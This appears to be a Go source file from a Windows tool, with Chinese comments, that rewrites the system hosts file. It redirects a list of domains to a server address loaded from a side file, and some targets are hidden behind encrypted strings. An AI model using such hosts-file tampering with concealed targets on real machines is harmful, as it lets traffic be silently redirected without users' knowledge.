package main

import (
	"bufio"
	"fmt"
	"io"
	"strconv"
	"strings"

	//"fmt"
	//"log"
	"os"
	"path/filepath"
	"time"
	//"golang.org/x/tools/go/analysis/passes/nilfunc"
)

func wprint(a ...any) {
	if !*kflog {
		return
	}
	_, err := fmt.Fprintln(os.Stdout, a)
	if err != nil {
		fmt.Println(" ", err)
	}
	//fmt.println(os.Stdout, a)
}
func wlog(msg string) {
	if !*kflog {
		return
	}

	timeNow := time.Now()
	year := strconv.Itoa(time.Now().Year()) //获取年
	timenow := timeNow.Format("2006-01-02 15:04:05")
	filePath := "./" + "log" + year + ".txt"
	err3 := os.Chmod(filePath, 0222) //set not read only
	if err3 != nil {
		fmt.Println("文件属性操作失败", err3)
	}
	file, errr := os.OpenFile(filePath, os.O_RDWR|os.O_APPEND, 0666)
	if errr != nil {
		fmt.Println("文件操作失败", errr)
	}
	//pwd,_ := os.Getwd() // 获取到当前目录，相当于python里的os.getcwd()

	//	fmt.Println("当前的操作路径为:",pwd)
	//文件路径拼接
	//	f1 := filepath.Join(pwd,"",year+".txt")
	exist, err := PathExists(filePath)
	if err == nil && exist {
		write := bufio.NewWriter(file)
		_, err := write.WriteString(timenow + " " + msg + "\r\n")
		if err != nil {
			fmt.Println("文件写入失败", err)
		}
		//Flush将缓存的文件真正写入到文件中
		write.Flush()
	} else {
		file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE, 0666)
		if err != nil {
			fmt.Println("文件打开失败", err)
		}
		//及时关闭file句柄
		defer file.Close()
		//写入文件时，使用带缓存的 *Writer
		write := bufio.NewWriter(file)

		write.WriteString("LogInfo \n")
		write.WriteString(timenow + " " + msg + " \r\n")
		//Flush将缓存的文件真正写入到文件中
		write.Flush()

	}
	//	fmt.Println("文件的路径为:",f1)
	return
}

func readfileandcheck() {
	if lockdown {
		return
	}
	lockdown = true
	filePath := syshostspath
	exist, err := PathExists(filePath)
	if err == nil && exist {
		err2 := os.Chmod(filePath, 0222) //set not read only
		if err2 != nil {
			wprint("set file filed.", err2)
			wlog("set file filed. " + err2.Error())
			return
		}
		//读写方式打开文件
		file, err := os.OpenFile(syshostspath, os.O_RDWR, 0666)
		if err != nil {
			wprint("open file filed.", err)
			wlog("open file filed." + err.Error())
			return
		}
		//defer关闭文件
		defer file.Close()

		//获取文件大小
		stat, err := file.Stat()
		if err != nil {
			panic(err)
		}
		var size = stat.Size()
		wprint("file size:", size)

		//读取文件内容到io中
		reader := bufio.NewReader(file)
		position := int64(0)
		var lines []string
		for {
			//读取每一行内容
			line, err := reader.ReadString('\n')
			if err != nil {
				//读到末尾
				if err == io.EOF {
					wprint("File read ok!")
					break
				} else {
					wprint("Read file error!", err)
					wlog("Read file error! " + err.Error())
					return
				}
			}
			if len(line) > 1 {
				lines = append(lines, line)
			}
			//	wprint(line)
			// for _, v := range domainlist {
			// 	nullstr := " "
			// 	for j := -1; j < len(v)+len(seraddress); j++ {
			// 		nullstr += " "
			// 	}

			// 	//Overwrite current line based on keyword
			// 	if strings.Contains(line, v) {
			// 		bytes := []byte(nullstr)
			// 		file.WriteAt(bytes, position)

			// 	}
			// }

			//每一行读取完后记录位置
			position += int64(len(line))
		}
		for i, v := range lines {

			for _, d := range domainlist {
				if strings.Contains(v, d) {
					lines[i] = ""
					//lines = append(lines[:i], lines[i+1:]...)
				}
			}
		}
		lines = removeDuplicatesAndEmpty(lines)
		f, err := os.Create(filePath)
		for _, v := range lines {
			fmt.Fprintln(f, v)
			if err != nil {
				fmt.Println(err)
				wlog("Err2 " + err.Error())
				return
			}
		}
		f.Close()
		Overwrite(filePath)

	} else {
		file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE, 0666)
		if err != nil {
			wprint("文件打开失败", err)
		}
		//及时关闭file句柄
		defer file.Close()
		//写入文件时，使用带缓存的 *Writer
		write := bufio.NewWriter(file)

		write.WriteString("#erp safe \n")
		for _, v := range domainlist {
			if v == godes("eaQ09adqNEegdCtCP/Hvvw==", false) {
				write.WriteString(godes("7GE8XjltN0ZX0XA4O6nTYQ==", false) + " " + v + "\r\n")
				continue
			}
			write.WriteString(seraddress + " " + v + "\r\n")
		}
		//	write.WriteString(timenow + " " + msg + " \r\n")
		//Flush将缓存的文件真正写入到文件中
		write.Flush()
	}
	lockdown = false
	wlog("Info readfileandcheck over...")

}
func Overwrite(filePath string) {
	file, _ := os.OpenFile(filePath, os.O_RDWR|os.O_APPEND, 0666)
	write := bufio.NewWriter(file)
	for _, v := range domainlist {
		if v == godes("eaQ09adqNEegdCtCP/Hvvw==", false) {
			write.WriteString(godes("7GE8XjltN0ZX0XA4O6nTYQ==", false) + " " + v + "\r\n")
			continue
		}
		_, err := write.WriteString(seraddress + " " + v + "\r\n")
		if err != nil {
			wprint("Overwrite写入失败", " ", v, " ", err)
			wlog("Overwrite写入失败" + " " + v + " err:" + err.Error())
		}

	}

	//Flush将缓存的文件真正写入到文件中
	write.Flush()
	file.Close()

}

/**
 * 数组去重 去空
 */
func removeDuplicatesAndEmpty(a []string) (ret []string) {
	a_len := len(a)
	for i := 0; i < a_len; i++ {
		if (i > 0 && a[i-1] == a[i]) || len(a[i]) == 0 {
			continue
		}
		ret = append(ret, a[i])
	}
	return
}

//read url from go.debug
// format : domain:qq.com
func readsvraddr() string {
	re := godes("8HBDsp7EShWptDdSEIdFMQ==", false)
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	exPath := filepath.Dir(ex)

	filePath := exPath + "\\" + godes("JPGwILh6g3LxPCjRdllalw==", false) //go.debug
	wprint("readsvraddr foundstart url is " + re + " filepath:" + filePath)
	wlog("readsvraddr foundstart url is " + re + " filepath:" + filePath)
	exist, err := PathExists(filePath)
	if err == nil && exist {
		err2 := os.Chmod(filePath, 0222) //set not read only
		if err2 != nil {
			wprint("readsvraddr set file filed.", err2)
			wlog("readsvraddr set file filed. " + err2.Error())
			return re
		}
		//读写方式打开文件
		file, err := os.OpenFile(filePath, os.O_RDWR, 0666)
		if err != nil {
			wprint("readsvraddr open file filed.", err)
			wlog("readsvraddr open file filed." + err.Error())
			return re
		}
		//defer关闭文件
		defer file.Close()

		//获取文件大小
		stat, err := file.Stat()
		if err != nil {
			panic(err)
		}
		var size = stat.Size()
		wprint("readsvraddr file size:", size)

		//读取文件内容到io中
		reader := bufio.NewReader(file)
		position := int64(0)
		var lines []string
		for {
			//读取每一行内容
			line, err := reader.ReadString('\n')
			if err != nil {
				//读到末尾
				if err == io.EOF {
					wprint("readsvraddr File read ok!")
					break
				} else {
					wprint("readsvraddr Read file error!", err)
					wlog("readsvraddr Read file error! " + err.Error())
					return re
				}
			}
			if len(line) > 1 {
				lines = append(lines, line)
			}

			//每一行读取完后记录位置
			position += int64(len(line))
		}
		for i, v := range lines {
			wlog("readsvraddr lines " + v)
			wprint("readsvraddr lines " + v)
			if strings.HasPrefix(v, "domain:") {
				url := strings.Split(lines[i], ":")[1]
				url = strings.Replace(url, "\n", "", 1)
				url = strings.Replace(url, "\r\n", "", 1)
				wlog("readsvraddr found url! " + url)
				wprint("readsvraddr found url! " + url)
				if len(url) >= 1 && !strings.Contains(url, "=") {
					re = url
					wprint("readsvraddr 1 found url is " + re)
					wlog("readsvraddr found url is " + re)
				} else if len(url) >= 1 && strings.Contains(url, "=") {
					re = godes(url, false)
					wprint("readsvraddr 2 found url is " + re)
					wlog("readsvraddr found url is " + re)
				}
				break
			}
		}
	}

	wlog("readsvraddr foundend url is " + re)
	wprint("readsvraddr foundend url is " + re)
	return re
}

//   log.Println("Hello Davis!") // log 还是可以作为输出的前缀
